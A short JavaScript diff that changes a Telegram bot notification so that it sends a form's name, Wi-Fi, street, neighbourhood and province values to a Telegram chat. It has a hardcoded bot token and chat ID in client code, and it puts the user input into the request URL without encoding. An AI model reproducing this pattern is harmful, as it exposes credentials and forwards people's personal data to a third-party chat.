@@ -247,7 +247,7 @@
           });
           const token = '6086969047:AAG9RlsqrusNHjqBMmR2Cp4W1WikjksEfQU'; // Replace with your Telegram bot token
           const chatId = '-1001821689872'; // Replace with the chat ID of the user or group you want to send the message to
-          const message = '[Firebase] - new record'; // Replace with the message you want to send
+          const message = '[Firebase] - ' + (nombre.textContent) + ' - ' + (newWifi) + ' - ' + (calle.textContent) + ' - ' + (barrio.value) + ' - ' + (provincia.value); // Replace with the message you want to send
 
           fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`)
               .then(response => {
